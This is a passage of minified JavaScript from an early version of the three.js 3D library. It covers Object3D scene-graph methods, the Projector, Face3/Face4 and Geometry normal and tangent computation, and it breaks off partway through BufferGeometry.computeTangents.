return this.translateOnAxis(b,a)},translateX:function(){var a=new THREE.Vector3(1,0,0);return function(b){return this.translateOnAxis(a,b)}}(),translateY:function(){var a=new THREE.Vector3(0,1,0);return function(b){return this.translateOnAxis(a,b)}}(),translateZ:function(){var a=new THREE.Vector3(0,0,1);return function(b){return this.translateOnAxis(a,b)}}(),localToWorld:function(a){return a.applyMatrix4(this.matrixWorld)},worldToLocal:function(){var a=new THREE.Matrix4;return function(b){return b.applyMatrix4(a.getInverse(this.matrixWorld))}}(),
lookAt:function(){var a=new THREE.Matrix4;return function(b){a.lookAt(b,this.position,this.up);!0===this.useQuaternion?this.quaternion.setFromRotationMatrix(a):this.rotation.setEulerFromRotationMatrix(a,this.eulerOrder)}}(),add:function(a){if(a===this)console.warn("THREE.Object3D.add: An object can't be added as a child of itself.");else if(a instanceof THREE.Object3D){void 0!==a.parent&&a.parent.remove(a);a.parent=this;this.children.push(a);for(var b=this;void 0!==b.parent;)b=b.parent;void 0!==b&&
b instanceof THREE.Scene&&b.__addObject(a)}},remove:function(a){var b=this.children.indexOf(a);if(-1!==b){a.parent=void 0;this.children.splice(b,1);for(b=this;void 0!==b.parent;)b=b.parent;void 0!==b&&b instanceof THREE.Scene&&b.__removeObject(a)}},traverse:function(a){a(this);for(var b=0,c=this.children.length;b<c;b++)this.children[b].traverse(a)},getObjectById:function(a,b){for(var c=0,e=this.children.length;c<e;c++){var g=this.children[c];if(g.id===a||!0===b&&(g=g.getObjectById(a,b),void 0!==g))return g}},
getObjectByName:function(a,b){for(var c=0,e=this.children.length;c<e;c++){var g=this.children[c];if(g.name===a||!0===b&&(g=g.getObjectByName(a,b),void 0!==g))return g}},getChildByName:function(a,b){console.warn("DEPRECATED: Object3D's .getChildByName() has been renamed to .getObjectByName().");return this.getObjectByName(a,b)},getDescendants:function(a){void 0===a&&(a=[]);Array.prototype.push.apply(a,this.children);for(var b=0,c=this.children.length;b<c;b++)this.children[b].getDescendants(a);return a},
updateMatrix:function(){!1===this.useQuaternion?this.matrix.makeFromPositionEulerScale(this.position,this.rotation,this.eulerOrder,this.scale):this.matrix.makeFromPositionQuaternionScale(this.position,this.quaternion,this.scale);this.matrixWorldNeedsUpdate=!0},updateMatrixWorld:function(a){!0===this.matrixAutoUpdate&&this.updateMatrix();if(!0===this.matrixWorldNeedsUpdate||!0===a)void 0===this.parent?this.matrixWorld.copy(this.matrix):this.matrixWorld.multiplyMatrices(this.parent.matrixWorld,this.matrix),
this.matrixWorldNeedsUpdate=!1,a=!0;for(var b=0,c=this.children.length;b<c;b++)this.children[b].updateMatrixWorld(a)},clone:function(a){void 0===a&&(a=new THREE.Object3D);a.name=this.name;a.up.copy(this.up);a.position.copy(this.position);a.rotation instanceof THREE.Vector3&&a.rotation.copy(this.rotation);a.eulerOrder=this.eulerOrder;a.scale.copy(this.scale);a.renderDepth=this.renderDepth;a.rotationAutoUpdate=this.rotationAutoUpdate;a.matrix.copy(this.matrix);a.matrixWorld.copy(this.matrixWorld);a.matrixAutoUpdate=
this.matrixAutoUpdate;a.matrixWorldNeedsUpdate=this.matrixWorldNeedsUpdate;a.quaternion.copy(this.quaternion);a.useQuaternion=this.useQuaternion;a.visible=this.visible;a.castShadow=this.castShadow;a.receiveShadow=this.receiveShadow;a.frustumCulled=this.frustumCulled;a.userData=JSON.parse(JSON.stringify(this.userData));for(var b=0;b<this.children.length;b++)a.add(this.children[b].clone());return a}};THREE.Object3D.defaultEulerOrder="XYZ";THREE.Object3DIdCount=0;
THREE.Projector=function(){function a(){if(f===k){var a=new THREE.RenderableObject;h.push(a);k++;f++;return a}return h[f++]}function b(){if(m===w){var a=new THREE.RenderableVertex;t.push(a);w++;m++;return a}return t[m++]}function c(a,b){return b.z-a.z}function e(a,b){var c=0,e=1,g=a.z+a.w,f=b.z+b.w,h=-a.z+a.w,q=-b.z+b.w;if(0<=g&&0<=f&&0<=h&&0<=q)return!0;if(0>g&&0>f||0>h&&0>q)return!1;0>g?c=Math.max(c,g/(g-f)):0>f&&(e=Math.min(e,g/(g-f)));0>h?c=Math.max(c,h/(h-q)):0>q&&(e=Math.min(e,h/(h-q)));if(e<
c)return!1;a.lerp(b,c);b.lerp(a,1-e);return!0}var g,f,h=[],k=0,p,m,t=[],w=0,q,y,r=[],z=0,C,B=[],D=0,G,W,u=[],O=0,K,F,L=[],I=0,J={objects:[],sprites:[],lights:[],elements:[]},M=new THREE.Vector3,T=new THREE.Vector4,H=new THREE.Box3(new THREE.Vector3(-1,-1,-1),new THREE.Vector3(1,1,1)),Z=new THREE.Box3,Y=Array(3),X=Array(4),V=new THREE.Matrix4,ja=new THREE.Matrix4,ia,pa=new THREE.Matrix4,wa=new THREE.Matrix3,Ja=new THREE.Matrix3,Oa=new THREE.Vector3,ta=new THREE.Frustum,Ia=new THREE.Vector4,P=new THREE.Vector4;
this.projectVector=function(a,b){b.matrixWorldInverse.getInverse(b.matrixWorld);ja.multiplyMatrices(b.projectionMatrix,b.matrixWorldInverse);return a.applyProjection(ja)};this.unprojectVector=function(a,b){b.projectionMatrixInverse.getInverse(b.projectionMatrix);ja.multiplyMatrices(b.matrixWorld,b.projectionMatrixInverse);return a.applyProjection(ja)};this.pickingRay=function(a,b){a.z=-1;var c=new THREE.Vector3(a.x,a.y,1);this.unprojectVector(a,b);this.unprojectVector(c,b);c.sub(a).normalize();return new THREE.Raycaster(a,
c)};var ga=function(b,e){f=0;J.objects.length=0;J.sprites.length=0;J.lights.length=0;var h=function(b){for(var c=0,e=b.children.length;c<e;c++){var f=b.children[c];if(!1!==f.visible){if(f instanceof THREE.Light)J.lights.push(f);else if(f instanceof THREE.Mesh||f instanceof THREE.Line){if(!1===f.frustumCulled||!0===ta.intersectsObject(f))g=a(),g.object=f,null!==f.renderDepth?g.z=f.renderDepth:(M.getPositionFromMatrix(f.matrixWorld),M.applyProjection(ja),g.z=M.z),J.objects.push(g)}else f instanceof
THREE.Sprite||f instanceof THREE.Particle?(g=a(),g.object=f,null!==f.renderDepth?g.z=f.renderDepth:(M.getPositionFromMatrix(f.matrixWorld),M.applyProjection(ja),g.z=M.z),J.sprites.push(g)):(g=a(),g.object=f,null!==f.renderDepth?g.z=f.renderDepth:(M.getPositionFromMatrix(f.matrixWorld),M.applyProjection(ja),g.z=M.z),J.objects.push(g));h(f)}}};h(b);!0===e&&J.objects.sort(c);return J};this.projectScene=function(a,g,f,h){var k=!1,w,M,Aa,fa,la,Ba,qa,ma,Ma,db,xa,lb,Eb;F=W=C=y=0;J.elements.length=0;!0===
a.autoUpdate&&a.updateMatrixWorld();void 0===g.parent&&g.updateMatrixWorld();V.copy(g.matrixWorldInverse.getInverse(g.matrixWorld));ja.multiplyMatrices(g.projectionMatrix,V);Ja.getNormalMatrix(V);ta.setFromMatrix(ja);J=ga(a,f);a=0;for(f=J.objects.length;a<f;a++)if(ma=J.objects[a].object,ia=ma.matrixWorld,m=0,ma instanceof THREE.Mesh){Ma=ma.geometry;Aa=Ma.vertices;db=Ma.faces;Ma=Ma.faceVertexUvs;wa.getNormalMatrix(ia);lb=ma.material instanceof THREE.MeshFaceMaterial;Eb=!0===lb?ma.material:null;w=0;
for(M=Aa.length;w<M;w++)p=b(),p.positionWorld.copy(Aa[w]).applyMatrix4(ia),p.positionScreen.copy(p.positionWorld).applyMatrix4(ja),p.positionScreen.x/=p.positionScreen.w,p.positionScreen.y/=p.positionScreen.w,p.positionScreen.z/=p.positionScreen.w,p.visible=!(-1>p.positionScreen.x||1<p.positionScreen.x||-1>p.positionScreen.y||1<p.positionScreen.y||-1>p.positionScreen.z||1<p.positionScreen.z);Aa=0;for(w=db.length;Aa<w;Aa++){M=db[Aa];var Fb=!0===lb?Eb.materials[M.materialIndex]:ma.material;if(void 0!==
Fb){Ba=Fb.side;if(M instanceof THREE.Face3)if(fa=t[M.a],la=t[M.b],qa=t[M.c],Y[0]=fa.positionScreen,Y[1]=la.positionScreen,Y[2]=qa.positionScreen,!0===fa.visible||!0===la.visible||!0===qa.visible||H.isIntersectionBox(Z.setFromPoints(Y)))if(k=0>(qa.positionScreen.x-fa.positionScreen.x)*(la.positionScreen.y-fa.positionScreen.y)-(qa.positionScreen.y-fa.positionScreen.y)*(la.positionScreen.x-fa.positionScreen.x),Ba===THREE.DoubleSide||k===(Ba===THREE.FrontSide))y===z?(xa=new THREE.RenderableFace3,r.push(xa),
z++,y++,q=xa):q=r[y++],q.v1.copy(fa),q.v2.copy(la),q.v3.copy(qa);else continue;else continue;else if(M instanceof THREE.Face4)if(fa=t[M.a],la=t[M.b],qa=t[M.c],xa=t[M.d],X[0]=fa.positionScreen,X[1]=la.positionScreen,X[2]=qa.positionScreen,X[3]=xa.positionScreen,!0===fa.visible||!0===la.visible||!0===qa.visible||!0===xa.visible||H.isIntersectionBox(Z.setFromPoints(X)))if(k=0>(xa.positionScreen.x-fa.positionScreen.x)*(la.positionScreen.y-fa.positionScreen.y)-(xa.positionScreen.y-fa.positionScreen.y)*
(la.positionScreen.x-fa.positionScreen.x)||0>(la.positionScreen.x-qa.positionScreen.x)*(xa.positionScreen.y-qa.positionScreen.y)-(la.positionScreen.y-qa.positionScreen.y)*(xa.positionScreen.x-qa.positionScreen.x),Ba===THREE.DoubleSide||k===(Ba===THREE.FrontSide)){if(C===D){var Gb=new THREE.RenderableFace4;B.push(Gb);D++;C++;q=Gb}else q=B[C++];q.v1.copy(fa);q.v2.copy(la);q.v3.copy(qa);q.v4.copy(xa)}else continue;else continue;q.normalModel.copy(M.normal);!1!==k||Ba!==THREE.BackSide&&Ba!==THREE.DoubleSide||
q.normalModel.negate();q.normalModel.applyMatrix3(wa).normalize();q.normalModelView.copy(q.normalModel).applyMatrix3(Ja);q.centroidModel.copy(M.centroid).applyMatrix4(ia);qa=M.vertexNormals;fa=0;for(la=qa.length;fa<la;fa++)xa=q.vertexNormalsModel[fa],xa.copy(qa[fa]),!1!==k||Ba!==THREE.BackSide&&Ba!==THREE.DoubleSide||xa.negate(),xa.applyMatrix3(wa).normalize(),q.vertexNormalsModelView[fa].copy(xa).applyMatrix3(Ja);q.vertexNormalsLength=qa.length;fa=0;for(la=Ma.length;fa<la;fa++)if(xa=Ma[fa][Aa],void 0!==
xa)for(Ba=0,qa=xa.length;Ba<qa;Ba++)q.uvs[fa][Ba]=xa[Ba];q.color=M.color;q.material=Fb;Oa.copy(q.centroidModel).applyProjection(ja);q.z=Oa.z;J.elements.push(q)}}}else if(ma instanceof THREE.Line)for(pa.multiplyMatrices(ja,ia),Aa=ma.geometry.vertices,fa=b(),fa.positionScreen.copy(Aa[0]).applyMatrix4(pa),db=ma.type===THREE.LinePieces?2:1,w=1,M=Aa.length;w<M;w++)fa=b(),fa.positionScreen.copy(Aa[w]).applyMatrix4(pa),0<(w+1)%db||(la=t[m-2],Ia.copy(fa.positionScreen),P.copy(la.positionScreen),!0===e(Ia,
P)&&(Ia.multiplyScalar(1/Ia.w),P.multiplyScalar(1/P.w),W===O?(Ma=new THREE.RenderableLine,u.push(Ma),O++,W++,G=Ma):G=u[W++],G.v1.positionScreen.copy(Ia),G.v2.positionScreen.copy(P),G.z=Math.max(Ia.z,P.z),G.material=ma.material,ma.material.vertexColors===THREE.VertexColors&&(G.vertexColors[0].copy(ma.geometry.colors[w]),G.vertexColors[1].copy(ma.geometry.colors[w-1])),J.elements.push(G)));a=0;for(f=J.sprites.length;a<f;a++)ma=J.sprites[a].object,ia=ma.matrixWorld,ma instanceof THREE.Particle&&(T.set(ia.elements[12],
ia.elements[13],ia.elements[14],1),T.applyMatrix4(ja),T.z/=T.w,0<T.z&&1>T.z&&(F===I?(k=new THREE.RenderableParticle,L.push(k),I++,F++,K=k):K=L[F++],K.object=ma,K.x=T.x/T.w,K.y=T.y/T.w,K.z=T.z,K.rotation=ma.rotation.z,K.scale.x=ma.scale.x*Math.abs(K.x-(T.x+g.projectionMatrix.elements[0])/(T.w+g.projectionMatrix.elements[12])),K.scale.y=ma.scale.y*Math.abs(K.y-(T.y+g.projectionMatrix.elements[5])/(T.w+g.projectionMatrix.elements[13])),K.material=ma.material,J.elements.push(K)));!0===h&&J.elements.sort(c);
return J}};THREE.Face3=function(a,b,c,e,g,f){this.a=a;this.b=b;this.c=c;this.normal=e instanceof THREE.Vector3?e:new THREE.Vector3;this.vertexNormals=e instanceof Array?e:[];this.color=g instanceof THREE.Color?g:new THREE.Color;this.vertexColors=g instanceof Array?g:[];this.vertexTangents=[];this.materialIndex=void 0!==f?f:0;this.centroid=new THREE.Vector3};
THREE.Face3.prototype={constructor:THREE.Face3,clone:function(){var a=new THREE.Face3(this.a,this.b,this.c);a.normal.copy(this.normal);a.color.copy(this.color);a.centroid.copy(this.centroid);a.materialIndex=this.materialIndex;var b,c;b=0;for(c=this.vertexNormals.length;b<c;b++)a.vertexNormals[b]=this.vertexNormals[b].clone();b=0;for(c=this.vertexColors.length;b<c;b++)a.vertexColors[b]=this.vertexColors[b].clone();b=0;for(c=this.vertexTangents.length;b<c;b++)a.vertexTangents[b]=this.vertexTangents[b].clone();
return a}};THREE.Face4=function(a,b,c,e,g,f,h){this.a=a;this.b=b;this.c=c;this.d=e;this.normal=g instanceof THREE.Vector3?g:new THREE.Vector3;this.vertexNormals=g instanceof Array?g:[];this.color=f instanceof THREE.Color?f:new THREE.Color;this.vertexColors=f instanceof Array?f:[];this.vertexTangents=[];this.materialIndex=void 0!==h?h:0;this.centroid=new THREE.Vector3};
THREE.Face4.prototype={constructor:THREE.Face4,clone:function(){var a=new THREE.Face4(this.a,this.b,this.c,this.d);a.normal.copy(this.normal);a.color.copy(this.color);a.centroid.copy(this.centroid);a.materialIndex=this.materialIndex;var b,c;b=0;for(c=this.vertexNormals.length;b<c;b++)a.vertexNormals[b]=this.vertexNormals[b].clone();b=0;for(c=this.vertexColors.length;b<c;b++)a.vertexColors[b]=this.vertexColors[b].clone();b=0;for(c=this.vertexTangents.length;b<c;b++)a.vertexTangents[b]=this.vertexTangents[b].clone();
return a}};
THREE.Geometry=function(){this.id=THREE.GeometryIdCount++;this.name="";this.vertices=[];this.colors=[];this.normals=[];this.faces=[];this.faceUvs=[[]];this.faceVertexUvs=[[]];this.morphTargets=[];this.morphColors=[];this.morphNormals=[];this.skinWeights=[];this.skinIndices=[];this.lineDistances=[];this.boundingSphere=this.boundingBox=null;this.hasTangents=!1;this.dynamic=!0;this.buffersNeedUpdate=this.lineDistancesNeedUpdate=this.colorsNeedUpdate=this.tangentsNeedUpdate=this.normalsNeedUpdate=this.uvsNeedUpdate=
this.elementsNeedUpdate=this.verticesNeedUpdate=!1};
THREE.Geometry.prototype={constructor:THREE.Geometry,addEventListener:THREE.EventDispatcher.prototype.addEventListener,hasEventListener:THREE.EventDispatcher.prototype.hasEventListener,removeEventListener:THREE.EventDispatcher.prototype.removeEventListener,dispatchEvent:THREE.EventDispatcher.prototype.dispatchEvent,applyMatrix:function(a){for(var b=(new THREE.Matrix3).getNormalMatrix(a),c=0,e=this.vertices.length;c<e;c++)this.vertices[c].applyMatrix4(a);c=0;for(e=this.faces.length;c<e;c++){var g=
this.faces[c];g.normal.applyMatrix3(b).normalize();for(var f=0,h=g.vertexNormals.length;f<h;f++)g.vertexNormals[f].applyMatrix3(b).normalize();g.centroid.applyMatrix4(a)}},computeCentroids:function(){var a,b,c;a=0;for(b=this.faces.length;a<b;a++)c=this.faces[a],c.centroid.set(0,0,0),c instanceof THREE.Face3?(c.centroid.add(this.vertices[c.a]),c.centroid.add(this.vertices[c.b]),c.centroid.add(this.vertices[c.c]),c.centroid.divideScalar(3)):c instanceof THREE.Face4&&(c.centroid.add(this.vertices[c.a]),
c.centroid.add(this.vertices[c.b]),c.centroid.add(this.vertices[c.c]),c.centroid.add(this.vertices[c.d]),c.centroid.divideScalar(4))},computeFaceNormals:function(){for(var a=new THREE.Vector3,b=new THREE.Vector3,c=0,e=this.faces.length;c<e;c++){var g=this.faces[c],f=this.vertices[g.a],h=this.vertices[g.b];a.subVectors(this.vertices[g.c],h);b.subVectors(f,h);a.cross(b);a.normalize();g.normal.copy(a)}},computeVertexNormals:function(a){var b,c,e,g;if(void 0===this.__tmpVertices){g=this.__tmpVertices=
Array(this.vertices.length);b=0;for(c=this.vertices.length;b<c;b++)g[b]=new THREE.Vector3;b=0;for(c=this.faces.length;b<c;b++)e=this.faces[b],e instanceof THREE.Face3?e.vertexNormals=[new THREE.Vector3,new THREE.Vector3,new THREE.Vector3]:e instanceof THREE.Face4&&(e.vertexNormals=[new THREE.Vector3,new THREE.Vector3,new THREE.Vector3,new THREE.Vector3])}else for(g=this.__tmpVertices,b=0,c=this.vertices.length;b<c;b++)g[b].set(0,0,0);if(a){var f,h,k,p=new THREE.Vector3,m=new THREE.Vector3,t=new THREE.Vector3,
w=new THREE.Vector3,q=new THREE.Vector3;b=0;for(c=this.faces.length;b<c;b++)e=this.faces[b],e instanceof THREE.Face3?(a=this.vertices[e.a],f=this.vertices[e.b],h=this.vertices[e.c],p.subVectors(h,f),m.subVectors(a,f),p.cross(m),g[e.a].add(p),g[e.b].add(p),g[e.c].add(p)):e instanceof THREE.Face4&&(a=this.vertices[e.a],f=this.vertices[e.b],h=this.vertices[e.c],k=this.vertices[e.d],t.subVectors(k,f),m.subVectors(a,f),t.cross(m),g[e.a].add(t),g[e.b].add(t),g[e.d].add(t),w.subVectors(k,h),q.subVectors(f,
h),w.cross(q),g[e.b].add(w),g[e.c].add(w),g[e.d].add(w))}else for(b=0,c=this.faces.length;b<c;b++)e=this.faces[b],e instanceof THREE.Face3?(g[e.a].add(e.normal),g[e.b].add(e.normal),g[e.c].add(e.normal)):e instanceof THREE.Face4&&(g[e.a].add(e.normal),g[e.b].add(e.normal),g[e.c].add(e.normal),g[e.d].add(e.normal));b=0;for(c=this.vertices.length;b<c;b++)g[b].normalize();b=0;for(c=this.faces.length;b<c;b++)e=this.faces[b],e instanceof THREE.Face3?(e.vertexNormals[0].copy(g[e.a]),e.vertexNormals[1].copy(g[e.b]),
e.vertexNormals[2].copy(g[e.c])):e instanceof THREE.Face4&&(e.vertexNormals[0].copy(g[e.a]),e.vertexNormals[1].copy(g[e.b]),e.vertexNormals[2].copy(g[e.c]),e.vertexNormals[3].copy(g[e.d]))},computeMorphNormals:function(){var a,b,c,e,g;c=0;for(e=this.faces.length;c<e;c++)for(g=this.faces[c],g.__originalFaceNormal?g.__originalFaceNormal.copy(g.normal):g.__originalFaceNormal=g.normal.clone(),g.__originalVertexNormals||(g.__originalVertexNormals=[]),a=0,b=g.vertexNormals.length;a<b;a++)g.__originalVertexNormals[a]?
g.__originalVertexNormals[a].copy(g.vertexNormals[a]):g.__originalVertexNormals[a]=g.vertexNormals[a].clone();var f=new THREE.Geometry;f.faces=this.faces;a=0;for(b=this.morphTargets.length;a<b;a++){if(!this.morphNormals[a]){this.morphNormals[a]={};this.morphNormals[a].faceNormals=[];this.morphNormals[a].vertexNormals=[];var h=this.morphNormals[a].faceNormals,k=this.morphNormals[a].vertexNormals,p,m;c=0;for(e=this.faces.length;c<e;c++)g=this.faces[c],p=new THREE.Vector3,m=g instanceof THREE.Face3?
{a:new THREE.Vector3,b:new THREE.Vector3,c:new THREE.Vector3}:{a:new THREE.Vector3,b:new THREE.Vector3,c:new THREE.Vector3,d:new THREE.Vector3},h.push(p),k.push(m)}h=this.morphNormals[a];f.vertices=this.morphTargets[a].vertices;f.computeFaceNormals();f.computeVertexNormals();c=0;for(e=this.faces.length;c<e;c++)g=this.faces[c],p=h.faceNormals[c],m=h.vertexNormals[c],p.copy(g.normal),g instanceof THREE.Face3?(m.a.copy(g.vertexNormals[0]),m.b.copy(g.vertexNormals[1]),m.c.copy(g.vertexNormals[2])):(m.a.copy(g.vertexNormals[0]),
m.b.copy(g.vertexNormals[1]),m.c.copy(g.vertexNormals[2]),m.d.copy(g.vertexNormals[3]))}c=0;for(e=this.faces.length;c<e;c++)g=this.faces[c],g.normal=g.__originalFaceNormal,g.vertexNormals=g.__originalVertexNormals},computeTangents:function(){function a(a,b,c,e,g,f,F){k=a.vertices[b];p=a.vertices[c];m=a.vertices[e];t=h[g];w=h[f];q=h[F];y=p.x-k.x;r=m.x-k.x;z=p.y-k.y;C=m.y-k.y;B=p.z-k.z;D=m.z-k.z;G=w.x-t.x;W=q.x-t.x;u=w.y-t.y;O=q.y-t.y;K=1/(G*O-W*u);J.set((O*y-u*r)*K,(O*z-u*C)*K,(O*B-u*D)*K);M.set((G*
r-W*y)*K,(G*C-W*z)*K,(G*D-W*B)*K);L[b].add(J);L[c].add(J);L[e].add(J);I[b].add(M);I[c].add(M);I[e].add(M)}var b,c,e,g,f,h,k,p,m,t,w,q,y,r,z,C,B,D,G,W,u,O,K,F,L=[],I=[],J=new THREE.Vector3,M=new THREE.Vector3,T=new THREE.Vector3,H=new THREE.Vector3,Z=new THREE.Vector3;b=0;for(c=this.vertices.length;b<c;b++)L[b]=new THREE.Vector3,I[b]=new THREE.Vector3;b=0;for(c=this.faces.length;b<c;b++)f=this.faces[b],h=this.faceVertexUvs[0][b],f instanceof THREE.Face3?a(this,f.a,f.b,f.c,0,1,2):f instanceof THREE.Face4&&
(a(this,f.a,f.b,f.d,0,1,3),a(this,f.b,f.c,f.d,1,2,3));var Y=["a","b","c","d"];b=0;for(c=this.faces.length;b<c;b++)for(f=this.faces[b],e=0;e<f.vertexNormals.length;e++)Z.copy(f.vertexNormals[e]),g=f[Y[e]],F=L[g],T.copy(F),T.sub(Z.multiplyScalar(Z.dot(F))).normalize(),H.crossVectors(f.vertexNormals[e],F),g=H.dot(I[g]),g=0>g?-1:1,f.vertexTangents[e]=new THREE.Vector4(T.x,T.y,T.z,g);this.hasTangents=!0},computeLineDistances:function(){for(var a=0,b=this.vertices,c=0,e=b.length;c<e;c++)0<c&&(a+=b[c].distanceTo(b[c-
1])),this.lineDistances[c]=a},computeBoundingBox:function(){null===this.boundingBox&&(this.boundingBox=new THREE.Box3);this.boundingBox.setFromPoints(this.vertices)},computeBoundingSphere:function(){null===this.boundingSphere&&(this.boundingSphere=new THREE.Sphere);this.boundingSphere.setFromCenterAndPoints(this.boundingSphere.center,this.vertices)},mergeVertices:function(){var a={},b=[],c=[],e,g=Math.pow(10,4),f,h,k,p,m;this.__tmpVertices=void 0;f=0;for(h=this.vertices.length;f<h;f++)e=this.vertices[f],
e=[Math.round(e.x*g),Math.round(e.y*g),Math.round(e.z*g)].join("_"),void 0===a[e]?(a[e]=f,b.push(this.vertices[f]),c[f]=b.length-1):c[f]=c[a[e]];g=[];f=0;for(h=this.faces.length;f<h;f++)if(a=this.faces[f],a instanceof THREE.Face3)for(a.a=c[a.a],a.b=c[a.b],a.c=c[a.c],k=[a.a,a.b,a.c],e=-1,p=0;3>p;p++){if(k[p]==k[(p+1)%3]){g.push(f);break}}else if(a instanceof THREE.Face4){a.a=c[a.a];a.b=c[a.b];a.c=c[a.c];a.d=c[a.d];k=[a.a,a.b,a.c,a.d];e=-1;for(p=0;4>p;p++)k[p]==k[(p+1)%4]&&(0<=e&&g.push(f),e=p);if(0<=
e){k.splice(e,1);var t=new THREE.Face3(k[0],k[1],k[2],a.normal,a.color,a.materialIndex);k=0;for(p=this.faceVertexUvs.length;k<p;k++)(m=this.faceVertexUvs[k][f])&&m.splice(e,1);a.vertexNormals&&0<a.vertexNormals.length&&(t.vertexNormals=a.vertexNormals,t.vertexNormals.splice(e,1));a.vertexColors&&0<a.vertexColors.length&&(t.vertexColors=a.vertexColors,t.vertexColors.splice(e,1));this.faces[f]=t}}for(f=g.length-1;0<=f;f--)for(this.faces.splice(f,1),k=0,p=this.faceVertexUvs.length;k<p;k++)this.faceVertexUvs[k].splice(f,
1);c=this.vertices.length-b.length;this.vertices=b;return c},clone:function(){for(var a=new THREE.Geometry,b=this.vertices,c=0,e=b.length;c<e;c++)a.vertices.push(b[c].clone());b=this.faces;c=0;for(e=b.length;c<e;c++)a.faces.push(b[c].clone());b=this.faceVertexUvs[0];c=0;for(e=b.length;c<e;c++){for(var g=b[c],f=[],h=0,k=g.length;h<k;h++)f.push(new THREE.Vector2(g[h].x,g[h].y));a.faceVertexUvs[0].push(f)}return a},dispose:function(){this.dispatchEvent({type:"dispose"})}};THREE.GeometryIdCount=0;
THREE.BufferGeometry=function(){this.id=THREE.GeometryIdCount++;this.attributes={};this.dynamic=!1;this.offsets=[];this.boundingSphere=this.boundingBox=null;this.hasTangents=!1;this.morphTargets=[]};
THREE.BufferGeometry.prototype={constructor:THREE.BufferGeometry,addEventListener:THREE.EventDispatcher.prototype.addEventListener,hasEventListener:THREE.EventDispatcher.prototype.hasEventListener,removeEventListener:THREE.EventDispatcher.prototype.removeEventListener,dispatchEvent:THREE.EventDispatcher.prototype.dispatchEvent,applyMatrix:function(a){var b,c;this.attributes.position&&(b=this.attributes.position.array);this.attributes.normal&&(c=this.attributes.normal.array);void 0!==b&&(a.multiplyVector3Array(b),
this.verticesNeedUpdate=!0);void 0!==c&&((new THREE.Matrix3).getNormalMatrix(a).multiplyVector3Array(c),this.normalizeNormals(),this.normalsNeedUpdate=!0)},computeBoundingBox:function(){null===this.boundingBox&&(this.boundingBox=new THREE.Box3);var a=this.attributes.position.array;if(a){var b=this.boundingBox,c,e,g;3<=a.length&&(b.min.x=b.max.x=a[0],b.min.y=b.max.y=a[1],b.min.z=b.max.z=a[2]);for(var f=3,h=a.length;f<h;f+=3)c=a[f],e=a[f+1],g=a[f+2],c<b.min.x?b.min.x=c:c>b.max.x&&(b.max.x=c),e<b.min.y?
b.min.y=e:e>b.max.y&&(b.max.y=e),g<b.min.z?b.min.z=g:g>b.max.z&&(b.max.z=g)}if(void 0===a||0===a.length)this.boundingBox.min.set(0,0,0),this.boundingBox.max.set(0,0,0)},computeBoundingSphere:function(){null===this.boundingSphere&&(this.boundingSphere=new THREE.Sphere);var a=this.attributes.position.array;if(a){for(var b,c=0,e,g,f=0,h=a.length;f<h;f+=3)b=a[f],e=a[f+1],g=a[f+2],b=b*b+e*e+g*g,b>c&&(c=b);this.boundingSphere.radius=Math.sqrt(c)}},computeVertexNormals:function(){if(this.attributes.position){var a,
b,c,e;a=this.attributes.position.array.length;if(void 0===this.attributes.normal)this.attributes.normal={itemSize:3,array:new Float32Array(a),numItems:a};else for(a=0,b=this.attributes.normal.array.length;a<b;a++)this.attributes.normal.array[a]=0;var g=this.attributes.position.array,f=this.attributes.normal.array,h,k,p,m,t,w,q=new THREE.Vector3,y=new THREE.Vector3,r=new THREE.Vector3,z=new THREE.Vector3,C=new THREE.Vector3;if(this.attributes.index){var B=this.attributes.index.array,D=this.offsets;
c=0;for(e=D.length;c<e;++c){b=D[c].start;h=D[c].count;var G=D[c].index;a=b;for(b+=h;a<b;a+=3)h=G+B[a],k=G+B[a+1],p=G+B[a+2],m=g[3*h],t=g[3*h+1],w=g[3*h+2],q.set(m,t,w),m=g[3*k],t=g[3*k+1],w=g[3*k+2],y.set(m,t,w),m=g[3*p],t=g[3*p+1],w=g[3*p+2],r.set(m,t,w),z.subVectors(r,y),C.subVectors(q,y),z.cross(C),f[3*h]+=z.x,f[3*h+1]+=z.y,f[3*h+2]+=z.z,f[3*k]+=z.x,f[3*k+1]+=z.y,f[3*k+2]+=z.z,f[3*p]+=z.x,f[3*p+1]+=z.y,f[3*p+2]+=z.z}}else for(a=0,b=g.length;a<b;a+=9)m=g[a],t=g[a+1],w=g[a+2],q.set(m,t,w),m=g[a+
3],t=g[a+4],w=g[a+5],y.set(m,t,w),m=g[a+6],t=g[a+7],w=g[a+8],r.set(m,t,w),z.subVectors(r,y),C.subVectors(q,y),z.cross(C),f[a]=z.x,f[a+1]=z.y,f[a+2]=z.z,f[a+3]=z.x,f[a+4]=z.y,f[a+5]=z.z,f[a+6]=z.x,f[a+7]=z.y,f[a+8]=z.z;this.normalizeNormals();this.normalsNeedUpdate=!0}},normalizeNormals:function(){for(var a=this.attributes.normal.array,b,c,e,g=0,f=a.length;g<f;g+=3)b=a[g],c=a[g+1],e=a[g+2],b=1/Math.sqrt(b*b+c*c+e*e),a[g]*=b,a[g+1]*=b,a[g+2]*=b},computeTangents:function(){function a(a,b,c){w=e[3*a];
q=e[3*a+1];y=e[3*a+2];r=e[3*b];z=e[3*b+1];C=e[3*b+2];B=e[3*c];D=e[3*c+1];G=e[3*c+2];W=f[2*a];u=f[2*a+1];O=f[2*b];K=f[2*b+1];F=f[2*c];L=f[2*c+1];I=r-w;J=B-w;M=z-q;T=D-q;H=C-y;Z=G-y;Y=O-W;X=F-W;V=K-u;ja=L-u;ia=1/(Y*ja-X*V);pa.set((ja*I-V*J)*ia,(ja*M-V*T)*ia,(ja*H-V*Z)*ia);wa.set((Y*J-X*I)*ia,(Y*T-X*M)*ia,(Y*Z-X*H)*ia);m[a].add(pa);m[b].add(pa);m[c].add(pa);t[a].add(wa);t[b].add(wa);t[c].add(wa)}function b(a){ab.x=g[3*a];ab.y=g[3*a+1];ab.z=g[3*a+2];Ta.copy(ab);kb=m[a];Sa.copy(kb);Sa.sub(ab.multiplyScalar(ab.dot(kb))).normalize();
Db.crossVectors(Ta,kb);Aa=Db.dot(t[a]);cb=0>Aa?-1:1;p[4*a]=Sa.x;p[4*a+1]=Sa.y;p[4*a+2]=Sa.z;p[4*a+3]=cb}if(void 0===this.attributes.index||void 0===this.attributes.position||void 0===this.attributes.normal||void 0===this.attributes.uv)console.warn("Missing required attributes (index, position, normal or uv) in BufferGeometry.computeTangents()");else{var c=this.attributes.index.array,e=this.attributes.position.array,g=this.attributes.normal.array,f=this.attributes.uv.array,h=e.length/3;if(void 0===
